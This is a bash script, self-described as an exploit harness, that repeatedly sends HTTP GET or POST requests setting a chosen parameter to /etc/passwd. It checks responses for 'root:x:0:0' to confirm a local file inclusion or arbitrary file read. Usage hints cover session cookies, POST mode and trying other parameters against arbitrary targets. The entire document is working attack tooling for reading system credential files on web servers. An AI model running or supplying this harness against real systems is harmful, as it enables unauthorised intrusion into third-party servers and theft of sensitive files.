#!/usr/bin/env bash
#
# Exploit harness / file read wrapper script (main.sh)
# Usage: [METHOD=POST] [COOKIE='...'] ./main.sh <target_url> <port> <parameter> [max_attempts]
#

set -euo pipefail

# Initialize variables and default hits counter to prevent integer comparison errors
hits=0

# Validate required arguments
if [ "$#" -lt 3 ]; then
    echo "[-] Error: Missing arguments."
    echo "Usage: [METHOD=POST] [COOKIE='...'] $0 <target_url> <port> <parameter> [max_attempts]"
    echo "Example: METHOD=POST COOKIE='PHPSESSID=xyz' $0 http://127.0.0.1 80 cmd 500"
    exit 1
fi

TARGET_ARG="$1"
PORT="$2"
PARAM="$3"
MAX_ATTEMPTS="${4:-100}"

# Determine protocol based on port
if [ "$PORT" = "443" ] || [ "$PORT" = "8443" ]; then
    PROTO="https"
else
    PROTO="http"
fi

# Clean leading protocol if present in target arg
CLEAN_TARGET=$(echo "$TARGET_ARG" | sed -E 's#^https?://##' | sed -E 's#/+$##')

# Separate host and path
HOST_PART=$(echo "$CLEAN_TARGET" | cut -d'/' -f1)
PATH_PART=$(echo "$CLEAN_TARGET" | cut -s -d'/' -f2-)

if [ -z "$PATH_PART" ] || [ "$HOST_PART" = "$PATH_PART" ]; then
    BASE_URL="${PROTO}://${HOST_PART}:${PORT}/"
else
    BASE_URL="${PROTO}://${HOST_PART}:${PORT}/${PATH_PART}"
fi

HTTP_METHOD="${METHOD:-GET}"
COOKIE_VAL="${COOKIE:-}"

echo "[*] Target Base URL: $BASE_URL"
echo "[*] Method: $HTTP_METHOD"
echo "[*] Parameter: $PARAM"
echo "[*] Max Attempts / Limit: $MAX_ATTEMPTS"

# Build curl base arguments
CURL_ARGS=(-s -X "$HTTP_METHOD" -k -i)
if [ -n "$COOKIE_VAL" ]; then
    CURL_ARGS+=(-H "Cookie: $COOKIE_VAL")
fi

# Execution loop
for ((i=1; i<=MAX_ATTEMPTS; i++)); do
    if [ "$HTTP_METHOD" = "POST" ]; then
        RESPONSE=$(curl "${CURL_ARGS[@]}" -d "${PARAM}=/etc/passwd" "$BASE_URL" 2>/dev/null || true)
    else
        if [[ "$BASE_URL" == *\?* ]]; then
            REQ_URL="${BASE_URL}&${PARAM}=/etc/passwd"
        else
            REQ_URL="${BASE_URL}?${PARAM}=/etc/passwd"
        fi
        RESPONSE=$(curl "${CURL_ARGS[@]}" "$REQ_URL" 2>/dev/null || true)
    fi

    # Check for successful file read indicator (e.g., root:x:0:0)
    if echo "$RESPONSE" | grep -q "root:x:0:0"; then
        echo "[+] Hit found on attempt $i!"
        echo "$RESPONSE"
        ((hits++))
        break
    else
        echo "[-] Attempt $i: No hit."
    fi
done

# Ensure hits is safely evaluated as an integer
hits=${hits:-0}

if [ "$hits" -gt 0 ]; then
    echo "[+] Exploit harness completed successfully with $hits hits."
    exit 0
else
    echo "[-] no hits. try:"
    echo "    $0 https://target.com 80 <other_param>"
    echo "    or add cookies:  COOKIE='PHPSESSID=...' $0 https://target.com 80 cmd"
    echo "    or POST mode:    METHOD=POST $0 https://target.com 80 cmd"
    exit 1
fi
